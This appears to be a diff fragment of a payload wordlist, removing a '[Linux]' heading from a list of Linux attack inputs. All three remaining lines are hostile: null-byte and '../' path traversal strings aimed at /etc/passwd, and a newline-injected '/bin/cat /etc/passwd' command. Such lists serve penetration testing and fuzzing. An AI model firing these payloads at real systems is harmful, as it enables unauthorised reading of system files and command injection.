@@ -1,4 +1,3 @@
-[Linux]
 %00../../../../../../etc/passwd
 %00/etc/passwd%00
 %0a/bin/cat%20/etc/passwd
